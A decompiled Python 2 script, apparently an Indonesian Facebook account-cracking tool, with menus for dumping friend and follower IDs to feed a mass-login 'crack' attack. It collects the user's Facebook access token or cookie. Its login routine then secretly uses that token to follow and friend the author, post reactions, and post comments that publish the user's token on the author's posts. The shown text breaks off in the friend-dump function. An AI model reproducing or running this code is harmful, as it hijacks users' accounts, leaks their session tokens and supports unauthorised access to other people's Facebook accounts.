# coding:utf-8
# decompile by itsuki

import itertools
import threading
import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [×] Modul bs4 belum terinstall!...\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[0;96m' # PUTIH
M = '\x1b[0;91m' # MERAH 
H = '\x1b[0;92m' # HIJAU
K = '\x1b[0;93m' # KUNING
B = '\x1b[0;94m' # BIRU
U = '\x1b[0;95m' # UNGU
O = '\x1b[0;92m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
b='\033[0;94m'
i='\033[0;92m'
c='\033[0;96m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;93m'
p='\033[0;97m'
h='\033[0;90m'
q='\x1b[0m'    # WARNA MATI
w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
my_color = [
 p, m, i, k, b, u, c, q]

ajg_lu = [my_color, w]

warna = random.choice(my_color)

ANGGA_XD = i+"""TERIMA KASIH KEPADA %sANGGA-XD
%s%s%s
%sFACEBOOK ANGGA-XD  %s: https://bit.ly/3g5qXAJ
%sWHATSAPP ANGGA-XD  %s: ENGGA BISA JUMPA :)
%sYOUTUBE ANGGA-XD   %s: https://bit.ly/356Hqhu
%sINSTAGRAM ANGGA-XD %s: https://bit.ly/3g4PoOE
%sGITHUB ANGGA-XD    %s: https://bit.ly/3v0iwuI%s"""%(warna,i,m,i,b,p,b,p,b,p,b,p,b,p,i)

DAPUNTA = (i+"""TERIMA KASIH KEPADA %sDAPUNTA
%s%s%s
%sFACEBOOK DAPUNTA   %s: https://bit.ly/3cpTFK7
%sWHATSAPP DAPUNTA   %s: ENGGA BISA JUMPA :)
%sYOUTUBE DAPUNTA    %s: ENGGA BISA JADI YOUTUBER
%sINSTAGRAM DAPUNTA  %s: https://bit.ly/2RCl6t7
%sGITHUB DAPUNTA     %s: https://bit.ly/3xdkj13%s
"""%(warna,i,m,i,b,p,b,p,b,p,b,p,b,p,i))

MR_RISKY = (i+"""TERIMA KASIH KEPADA %sMR.RISKY
%s%s%s
%sFACEBOOK MR.RISKY  %s: https://bit.ly/3x8BFMt
%sWHATSAPP MR.RISKY  %s: 6283143565470
%sYOUTUBE MR.RISKY   %s: https://bit.ly/3w6HVnZ
%sINSTAGRAM MR.RISKY %s: ENGGA PANDE PAKAI IG :V
%sGITHUB MR.RISKY    %s: https://bit.ly/359iKF7%s"""%(warna,i,m,i,b,p,b,p,b,p,b,p,b,p,i))

YAYAN_XD = (i+"""TERIMA KASIH KEPADA %sYAYAN-XD
%s%s%s
%sFACEBOOK YAYAN-XD  %s: https://bit.ly/3g87Oya
%sWHATSAPP YAYAN-XD  %s: ENGGA BISA JUMPA :)
%sYOUTUBE YAYAN-XD   %s: https://bit.ly/3xe3Iu5
%sINSTAGRAM YAYAN-XD %s: https://bit.ly/3ipaysp
%sGITHUB YAYAN-XD    %s: https://bit.ly/3gjqHgb%s"""%(warna,i,m,i,b,p,b,p,b,p,b,p,b,p,p))

my_logo = [MR_RISKY, DAPUNTA, ANGGA_XD, YAYAN_XD]
logo_random = random.choice(my_logo);time.sleep(1)

ris = random.choice([m+'██████╗░███╗░░░███╗██████╗░███████╗\n██╔══██╗████╗░████║██╔══██╗██╔════╝\n██████╔╝██╔████╔██║██████╦╝█████╗░░\n'+p+'██╔══██╗██║╚██╔╝██║██╔══██╗██╔══╝░░\n██║░░██║██║░╚═╝░██║██████╦╝██║░░░░░\n╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░\n'+c+'Script By Mr.Risky',warna+'███╗░░░███╗██████╗░░░░██████╗░██╗░██████╗██╗░░██╗██╗░░░██╗\n████╗░████║██╔══██╗░░░██╔══██╗██║██╔════╝██║░██╔╝╚██╗░██╔╝\n██╔████╔██║██████╔╝░░░██████╔╝██║╚█████╗░█████═╝░░╚████╔╝░\n'+p+'██║╚██╔╝██║██╔══██╗░░░██╔══██╗██║░╚═══██╗██╔═██╗░░░╚██╔╝░░\n██║░╚═╝░██║██║░░██║██╗██║░░██║██║██████╔╝██║░╚██╗░░░██║░░░\n╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░\n'+c+'Jangan Lupa DiFollow Github Ane',warna+'██╗░░░██╗░█████╗░██╗░░░██╗░█████╗░███╗░░██╗░░░░░░██╗░░██╗██████╗░\n╚██╗░██╔╝██╔══██╗╚██╗░██╔╝██╔══██╗████╗░██║░░░░░░╚██╗██╔╝██╔══██╗\n░╚████╔╝░███████║░╚████╔╝░███████║██╔██╗██║█████╗░╚███╔╝░██║░░██║\n'+p+'░░╚██╔╝░░██╔══██║░░╚██╔╝░░██╔══██║██║╚████║╚════╝░██╔██╗░██║░░██║\n░░░██║░░░██║░░██║░░░██║░░░██║░░██║██║░╚███║░░░░░░██╔╝╚██╗██████╔╝\n░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░░░░╚═╝░░╚═╝╚═════╝░\n'+c+'Jangan Lupa Coli Tiap Hari :)',warna+'░█████╗░███╗░░██╗░██████╗░░██████╗░░█████╗░░░░░░░██╗░░██╗██████╗░\n██╔══██╗████╗░██║██╔════╝░██╔════╝░██╔══██╗░░░░░░╚██╗██╔╝██╔══██╗\n███████║██╔██╗██║██║░░██╗░██║░░██╗░███████║█████╗░╚███╔╝░██║░░██║\n'+p+'██╔══██║██║╚████║██║░░╚██╗██║░░╚██╗██╔══██║╚════╝░██╔██╗░██║░░██║\n██║░░██║██║░╚███║╚██████╔╝╚██████╔╝██║░░██║░░░░░░██╔╝╚██╗██████╔╝\n╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚═════╝░╚═╝░░╚═╝░░░░░░╚═╝░░╚═╝╚═════╝░\n'+c+'Jangan Lupa DiFollow Githun Ane ;)',warna+'██████╗░░█████╗░██████╗░██╗░░░██╗███╗░░██╗████████╗░█████╗░\n██╔══██╗██╔══██╗██╔══██╗██║░░░██║████╗░██║╚══██╔══╝██╔══██╗\n██║░░██║███████║██████╔╝██║░░░██║██╔██╗██║░░░██║░░░███████║\n'+p+'██║░░██║██╔══██║██╔═══╝░██║░░░██║██║╚████║░░░██║░░░██╔══██║\n██████╔╝██║░░██║██║░░░░░╚██████╔╝██║░╚███║░░░██║░░░██║░░██║\n╚═════╝░╚═╝░░╚═╝╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝\n'+c+'Jangan Lupa BerZikir... Karena Itu Sangat Penting :)'+'\r']);time.sleep(0.5)
ris2 = random.choice([m+'██████╗░███╗░░░███╗██████╗░███████╗\n██╔══██╗████╗░████║██╔══██╗██╔════╝\n██████╔╝██╔████╔██║██████╦╝█████╗░░\n'+p+'██╔══██╗██║╚██╔╝██║██╔══██╗██╔══╝░░\n██║░░██║██║░╚═╝░██║██████╦╝██║░░░░░\n╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░\n'+c+'Script By Mr.Risky',warna+'███╗░░░███╗██████╗░░░░██████╗░██╗░██████╗██╗░░██╗██╗░░░██╗\n████╗░████║██╔══██╗░░░██╔══██╗██║██╔════╝██║░██╔╝╚██╗░██╔╝\n██╔████╔██║██████╔╝░░░██████╔╝██║╚█████╗░█████═╝░░╚████╔╝░\n'+p+'██║╚██╔╝██║██╔══██╗░░░██╔══██╗██║░╚═══██╗██╔═██╗░░░╚██╔╝░░\n██║░╚═╝░██║██║░░██║██╗██║░░██║██║██████╔╝██║░╚██╗░░░██║░░░\n╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░\n'+c+'Jangan Lupa DiFollow Github Ane',warna+'██╗░░░██╗░█████╗░██╗░░░██╗░█████╗░███╗░░██╗░░░░░░██╗░░██╗██████╗░\n╚██╗░██╔╝██╔══██╗╚██╗░██╔╝██╔══██╗████╗░██║░░░░░░╚██╗██╔╝██╔══██╗\n░╚████╔╝░███████║░╚████╔╝░███████║██╔██╗██║█████╗░╚███╔╝░██║░░██║\n'+p+'░░╚██╔╝░░██╔══██║░░╚██╔╝░░██╔══██║██║╚████║╚════╝░██╔██╗░██║░░██║\n░░░██║░░░██║░░██║░░░██║░░░██║░░██║██║░╚███║░░░░░░██╔╝╚██╗██████╔╝\n░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░░░░╚═╝░░╚═╝╚═════╝░\n'+c+'Jangan Lupa Coli Tiap Hari :)',warna+'░█████╗░███╗░░██╗░██████╗░░██████╗░░█████╗░░░░░░░██╗░░██╗██████╗░\n██╔══██╗████╗░██║██╔════╝░██╔════╝░██╔══██╗░░░░░░╚██╗██╔╝██╔══██╗\n███████║██╔██╗██║██║░░██╗░██║░░██╗░███████║█████╗░╚███╔╝░██║░░██║\n'+p+'██╔══██║██║╚████║██║░░╚██╗██║░░╚██╗██╔══██║╚════╝░██╔██╗░██║░░██║\n██║░░██║██║░╚███║╚██████╔╝╚██████╔╝██║░░██║░░░░░░██╔╝╚██╗██████╔╝\n╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚═════╝░╚═╝░░╚═╝░░░░░░╚═╝░░╚═╝╚═════╝░\n'+c+'Jangan Lupa DiFollow Githun Ane ;)',warna+'██████╗░░█████╗░██████╗░██╗░░░██╗███╗░░██╗████████╗░█████╗░\n██╔══██╗██╔══██╗██╔══██╗██║░░░██║████╗░██║╚══██╔══╝██╔══██╗\n██║░░██║███████║██████╔╝██║░░░██║██╔██╗██║░░░██║░░░███████║\n'+p+'██║░░██║██╔══██║██╔═══╝░██║░░░██║██║╚████║░░░██║░░░██╔══██║\n██████╔╝██║░░██║██║░░░░░╚██████╔╝██║░╚███║░░░██║░░░██║░░██║\n╚═════╝░╚═╝░░╚═╝╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝\n'+c+'Jangan Lupa BerZikir... Karena Itu Sangat Penting :)']);time.sleep(0.5)
ris3 = random.choice([m+'██████╗░███╗░░░███╗██████╗░███████╗\n██╔══██╗████╗░████║██╔══██╗██╔════╝\n██████╔╝██╔████╔██║██████╦╝█████╗░░\n'+p+'██╔══██╗██║╚██╔╝██║██╔══██╗██╔══╝░░\n██║░░██║██║░╚═╝░██║██████╦╝██║░░░░░\n╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░\n'+c+'Script By Mr.Risky',warna+'███╗░░░███╗██████╗░░░░██████╗░██╗░██████╗██╗░░██╗██╗░░░██╗\n████╗░████║██╔══██╗░░░██╔══██╗██║██╔════╝██║░██╔╝╚██╗░██╔╝\n██╔████╔██║██████╔╝░░░██████╔╝██║╚█████╗░█████═╝░░╚████╔╝░\n'+p+'██║╚██╔╝██║██╔══██╗░░░██╔══██╗██║░╚═══██╗██╔═██╗░░░╚██╔╝░░\n██║░╚═╝░██║██║░░██║██╗██║░░██║██║██████╔╝██║░╚██╗░░░██║░░░\n╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░\n'+c+'Jangan Lupa DiFollow Github Ane',warna+'██╗░░░██╗░█████╗░██╗░░░██╗░█████╗░███╗░░██╗░░░░░░██╗░░██╗██████╗░\n╚██╗░██╔╝██╔══██╗╚██╗░██╔╝██╔══██╗████╗░██║░░░░░░╚██╗██╔╝██╔══██╗\n░╚████╔╝░███████║░╚████╔╝░███████║██╔██╗██║█████╗░╚███╔╝░██║░░██║\n'+p+'░░╚██╔╝░░██╔══██║░░╚██╔╝░░██╔══██║██║╚████║╚════╝░██╔██╗░██║░░██║\n░░░██║░░░██║░░██║░░░██║░░░██║░░██║██║░╚███║░░░░░░██╔╝╚██╗██████╔╝\n░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░░░░╚═╝░░╚═╝╚═════╝░\n'+c+'Jangan Lupa Coli Tiap Hari :)',warna+'░█████╗░███╗░░██╗░██████╗░░██████╗░░█████╗░░░░░░░██╗░░██╗██████╗░\n██╔══██╗████╗░██║██╔════╝░██╔════╝░██╔══██╗░░░░░░╚██╗██╔╝██╔══██╗\n███████║██╔██╗██║██║░░██╗░██║░░██╗░███████║█████╗░╚███╔╝░██║░░██║\n'+p+'██╔══██║██║╚████║██║░░╚██╗██║░░╚██╗██╔══██║╚════╝░██╔██╗░██║░░██║\n██║░░██║██║░╚███║╚██████╔╝╚██████╔╝██║░░██║░░░░░░██╔╝╚██╗██████╔╝\n╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚═════╝░╚═╝░░╚═╝░░░░░░╚═╝░░╚═╝╚═════╝░\n'+c+'Jangan Lupa DiFollow Githun Ane ;)',warna+'██████╗░░█████╗░██████╗░██╗░░░██╗███╗░░██╗████████╗░█████╗░\n██╔══██╗██╔══██╗██╔══██╗██║░░░██║████╗░██║╚══██╔══╝██╔══██╗\n██║░░██║███████║██████╔╝██║░░░██║██╔██╗██║░░░██║░░░███████║\n'+p+'██║░░██║██╔══██║██╔═══╝░██║░░░██║██║╚████║░░░██║░░░██╔══██║\n██████╔╝██║░░██║██║░░░░░╚██████╔╝██║░╚███║░░░██║░░░██║░░██║\n╚═════╝░╚═╝░░╚═╝╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝\n'+c+'Jangan Lupa BerZikir... Karena Itu Sangat Penting :)'+'\r']);time.sleep(0.5)
#Risky
#Angga
#Yayan
#Dapunta
#------------->> Terima Kasih
asw = "5000"
ihh = "5000"
ok = []
cp = []
id = []
ttl =[]
user = []
loop = 0
dumai = "https://mbasic.facebook.com"
# lempankkkkkkkk
def __cek__():
	try:
	    __cindy__=open('login.txt','r').read()
	    token=open('login.txt','r').read()
	    toket=open('login.txt','r').read()
	except (KeyError, IOError):
	    os.system('clear')
	    print '\n %s[%s×%s]Token Error'%(N,M,N)
	    time.sleep(2)
	    os.system('rm -rf login.txt')
	    yayanxd()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#ngentodddddddddddddddd
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s]Delete Token Facebook %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
def tik():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s]Loading.. %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

IP = requests.get('https://api.ipify.org').text
# LO KONTOL
logo = (c+"""  _______              __       ___ 
 |   _   \ .--------. |  |--. .'  _|
 |.  l   / |        | |  _  | |   _|
 |.  _   1 |__|__|__| |_____| |__|"""+k+"""Mr.Risky"""+c+"""
 |:  |   |"""+k+"""Angga"""+c+"""
 |::.|:. |"""+k+"""Yayan"""+c+"""
 `--- ---'"""+k+"""Dapunta"""+c+"""
WhatsApp : 6283143565470
Facebook : m.facebook.com/llovexnxx
Github   : https://github.com/Dumai-991""")

# crack selesai
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print ' \n\n[%sOK%s]Jumlah Akun Sukses      : %s%s%s'%(O,N,H,str(len(ok)),N)
		print ' [%sCP%s]Jumlah Akun Cheak-Poins : %s%s%s'%(O,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n\n [%s!%s]Maaf Kamu Tidak Mendapatkan Hasil:('%(M,N)
		exit()
# Token FB bukan token PLN
def __token__():
	os.system('clear')
	print logo
	print k+'Halo Ngab !!\n'+p+'Script Ini Menggunakan Token Facebook..!!\nJika Anda Tidak Mempunyai Token Faceboon Silahkan Ketik '+p+': Get\n\nTutorial Get Aksess Token Facebook !!\n\n1. Silahkan Buka Terbidahulu Google\n2. Buka Link Ini : ( m.facebook.com )\n•. Pastikan Facebook Anda Menggunakan Mode Data Internet !!\n3. Silahkan Login Facebook Kamu :)\n4. Jika Sudah Silahkan Copy Link DiBawah Ini !!\n•. ( https://free.facebook.com/zero/toggle/nux/?_rdc=1&_rdr )\n5. Tekan Ikon Titik Tiga DiSebelah Kanan ( Option )\n6. Pilih Option ( Cari Di Halaman )\n7. Tulis Seperti Ini ( EAAA )\n8. Hepyy Tinggal Copy Token Fecboon Anda :)\n\n'+c+'Semoga Bermanfaat !!'
	print(c+"Ketik : Get\n Untuk Lanjut KeUrl Get Akses Token")
	__cindy__ = raw_input('\n %s[%s?%s]Token Facebook :%s '%(N,M,N,H))
	if __cindy__ in ('get', 'Get', 'GET'):
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		__token__()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('login.txt', 'w')
		zedd.write(__cindy__)
		zedd.close()
		print k+'\nSelamat Datang : '+c+nama
		print k+'Status Anda      : '+c+'FREE'
		kontol()
	except KeyError:
		print '\n\n %s[%s!%s]Token Error !!'%(N,M,N)
		time.sleep(2)
		__token__()
### Get Token Facebook
class awokawokawok:
	def __init__(self):
		self.semua=open("info.txt").read()
		self.jonson=json.loads(self.semua)
		self.cookies=self.jonson["cookies"]
		self.menu()
def yayanxd():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		print logo
		print(c+"\n ["+k+"?"+c+"]"+p+"Silahkan Pilih Method Login "+m+"!!")
		print(c+" ["+p+"1"+c+"]"+p+"Login Menggunakan Token Facebook")
		print(c+" ["+p+"2"+c+"]"+p+"Login Menggunakan Cookie Facebook")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			__token__()
		elif ask == "2" or ask == "02":
			cookie1()
		else:
			login()

def cookie1():
	os.system("clear")
	print logo
	print(c+"\n ["+m+"!"+c+"]"+p+"Masukkan Cookie Facebook Anda !!!")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36',
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	kontol()
	False
### ORANG GANTENG ###
def menu():
    moch_yayan()
def moch_yayan():
    os.system("clear")
    True
    try:
        __cindy__=open('login.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s]Token Error'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf login.txt')
        yayanxd()
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        ID = jaoanzjwowj['id']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s]Token Error !!'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf login.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s]Tidak Ada Network\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
    print k+'['+i+'══════════════════════════════════════════════════════'+k+']'
    print logo_random
    print k+'['+i+'══════════════════════════════════════════════════════'+k+']'
    print k+' ['+c+'++'+k+']->'+p+'Hallo !!: '+c+nama
    print k+' ['+c+'++'+k+']->'+p+'Your IP : '+c+IP
    print k+' ['+c+'++'+k+']->'+p+'Status  : '+m+'Not Premium'
    print k+' ['+c+'++'+k+']->'+p+'Your ID : '+c+ID
    print k+'['+i+'══════════════════════════════════════════════════════'+k+']'
    print k+' ['+i+'01'+k+']'+b+'=>'+p+'Dump ID Dari Daftar Teman'+k+' [ '+c+'FREE'+k+' ]'+q
    print k+' ['+i+'02'+k+']'+b+'=>'+p+'Dump ID Dari Teman Public'+k+' [ '+c+'FREE'+k+' ]'+q
    print k+' ['+i+'03'+k+']'+b+'=>'+p+'Dump ID Dari Total Followers'+k+' [ '+c+'FREE'+k+' ]'+q
    print k+' ['+i+'04'+k+']'+b+'=>'+p+'Dump ID Dari Postingan'+k+' [ '+c+'FREE'+k+' ]'+q
    print k+' ['+i+'05'+k+']'+b+'=>'+p+'Dump ID Dari Halaman'+k+' [ '+i+'Premium'+k+' ]'+q
    print k+' ['+i+'06'+k+']'+b+'=>'+p+'Dump ID Dari Group'+k+' [ '+i+'Premium'+k+' ]'+q
    print k+' ['+i+'07'+k+']'+b+'=>'+p+'Start Crack'
    print k+' ['+i+'08'+k+']'+b+'=>'+p+'Get Informations Target'+k+' [ '+c+'FREE'+k+' ]'+q
    print k+' ['+i+'09'+k+']'+b+'=>'+p+'Lihat Hasil Crack'
    print k+' ['+i+'10'+k+']'+b+'=>'+p+'Seting User Agent'
    print k+' ['+i+'11'+k+']'+b+'=>'+p+'Cheak Token Facebook'
    print k+' ['+i+'12'+k+']'+b+'=>'+p+'Info Script '+c+'RMBF'
    print k+' ['+i+'13'+k+']'+b+'=>'+p+'Restart Script'
    print k+' ['+i+'00'+k+']'+b+'=>'+p+'Exit '+k+'['+c+' DELETE TOKEN/COOKIES FACEBOOK '+k+']'+q
    awokawokawokawokawokawokawokawokawokawokawokawok()
#+k+'[ '+c+'FREE'+k+' ]'+q
#    print ' ['+i+''+k+']'+b+'=>'+p+''
#---->>> Untuk Copy Lalu DiPaste
#Asede Kntl
#╔
#══
#╦
#╗
#╚
#╩
#╝
# Untuk Logo

def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input(k+'\n ['+i+'??'+k+']'+p+'Select Menu : '+q)
        if yan == '':
		print m+"Lo Kntl !!";time.sleep(0.2)
		menu()
        elif yan =='1' or yan =='01':
                teman()
        elif yan =='2' or yan =='02':
                publik()
        elif yan =='10' or yan =='10':
        	seting_yntkts()
        elif yan =='3' or yan =='03':
                followers()
        elif yan =='4' or yan =='04':
                postingan()
        elif yan =='7' or yan =='07':
                __crack__().slurr()
        elif yan =='5' or yan =='05':
        	jalan(m+"Maaf Anda Bukan User Premium !!");time.sleep(2)
		menu()
        elif yan =='6' or yan =='06':
        	jalan(m+"Maaf Anda Bukan User Premium !!");time.sleep(2)
		menu()
        elif yan =='8' or yan =='08':
        	cek_ingfo()
        elif yan =='9' or yan =='09':
            print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check Hasil OK")
            print(" \033[0;97m[\033[0;96m2\033[0;97m] Check Hasil CP")
            ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
            if ask =="":
                moch_yayan()
            elif ask == "1" or ask == "01":
                try:
                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;92m\n"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    moch_yayan()
                except (IOError):
                    print("\n \033[0;97m[\033[0;91m!\033[0;97m]Hasil Crack Yang Suksess, Tidak Ada :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            elif ask == "2" or ask == "02":
                try:
                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;93m\n"%(ha, op, ta,M,K,len(totalcp)))
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
                except (IOError):
                    print("\n \033[0;97m[\033[0;91m!\033[0;97m]Hasil Crack Yang Cheak Point, Tidak Ada :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            else:
                moch_yayan()
        elif yan =='11' or yan =='11':
		os.system("cat login.txt")
                kontol()
        elif yan =='12' or yan =='12':
        	info_tools()
        elif yan =='13' or yan =='13':
        	menu()
        elif yan =='0' or yan =='00':
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf login.txt')
                jalan ('\n %s[%s✓%s]%s Delete Token Facebook Seukses'%(N,H,N,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s×%s]Menu [%s%s%s] Ini Tidak Terdaftar !!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
def kontol():
	try:
		__cindy__ = open('login.txt', 'r').read()
		token = open('login.txt', 'r').read()
		toket = open('login.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%s×%s]Token Error !!'%(N,M,N)
		os.system('rm -rf login.txt')
	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=%s'%(__cindy__))
	post = '120338706765807'
	post2 = '172628718203472'
	srghun = '100007639052164'
	fdrffg = '120338706765807'
	kom3 = "Semoga Abang @[100063690353340:0] Panjang Umur Amin !!"
	fdrffg2 = '172621751537502'
	vyhbhj = 'ANGRY'
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(srghun,__cindy__))
	requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg,vyhbhj,__cindy__))
	requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg2,vyhbhj,__cindy__))
	requests.post('https://graph.facebook.com/' + post + '/comments/?message=Bang @[100063690353340:0] Coba Lihat Token Aku\n'+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=Bang @[100063690353340:0] Coba Lihat Token Aku\n'+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom3 + '&access_token=' + token)
	jalan((i+"Login Suksess !!"));time.sleep(2)
	moch_yayan()					
# dump id dari teman hehe
def teman():
    try:
        __cindy__= open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s]Token Error !!'%(N,M,N)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + nama  + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
